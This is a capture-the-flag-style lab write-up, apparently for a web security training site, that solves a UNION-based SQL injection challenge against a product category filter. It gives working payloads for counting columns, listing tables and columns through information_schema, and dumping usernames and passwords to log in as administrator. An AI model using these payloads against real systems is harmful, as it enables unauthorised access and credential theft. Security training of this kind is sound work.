# Lab: SQL injection attack, listing the database contents on non-Oracle databases

## Lab Description
This lab contains a SQL injection vulnerability in the product category filter.  
The application returns query results in the response, allowing a UNION-based SQL injection attack.

The database includes a table containing usernames and passwords.  
Your task is to identify this table, extract its columns, and retrieve user credentials.

---

## Goal
- Identify the user credentials table  
- Extract username and password columns  
- Log in as the administrator user  

---

## Steps to Solve

### Step 1: Intercept the Request
1. Open the lab in your browser  
2. Start Burp Suite  
3. Click on any product category  
4. Capture the request in HTTP History  
5. Send the request to Repeater  

---

### Step 2: Find Number of Columns


'+UNION+SELECT+NULL--+
'+UNION+SELECT+NULL,NULL--+


Increase NULLs until no error appears  

Result: 2 columns  

---

### Step 3: Identify Text Columns


'+UNION+SELECT+'abc','def'--+


If values are reflected → columns support text  

Result: Both columns accept text  

---

### Step 4: Retrieve Table Names and Column Names


'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--+


Look for table containing user data  

Example: users_xxxxxx  

---

### Step 5: Retrieve Column Names


'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_xxxxxx'--+


Example columns:
- username_xxxxxx  
- password_xxxxxx  

---

### Step 6: Extract User Credentials


'+UNION+SELECT+username_xxxxxx,password_xxxxxx+FROM+users_xxxxxx--+


Retrieve all usernames and passwords  

---

### Step 7: Login as Administrator

- Find administrator credentials  
- Use them to log in  

Lab solved  

---

## Key Payloads


'+UNION+SELECT+NULL,NULL--+
'+UNION+SELECT+'abc','def'--+
'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--+
'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_xxxxxx'--+
'+UNION+SELECT+username_xxxxxx,password_xxxxxx+FROM+users_xxxxxx--+


---

## Explanation

- UNION SELECT combines original query with injected query  
- information_schema.tables → lists tables  
- information_schema.columns → lists columns  
- Attack flow:
  1. Find column count  
  2. Identify data types  
  3. Extract schema  
  4. Dump credentials  

---

## Conclusion

- Discovered database structure  
- Identified users table  
- Extracted credentials  
- Logged in as administrator  

- Note: I have solved this lab via directly quering for both column name and table name using-
	' UNION SELECT COLUMN_NAME,TABLE_NAME FROM information_schema.columns--
By doing this I then anlyzed the result to see username and password namelike columns in same table and throgh trial and error objective was achived. 

Lab Completed Successfully  
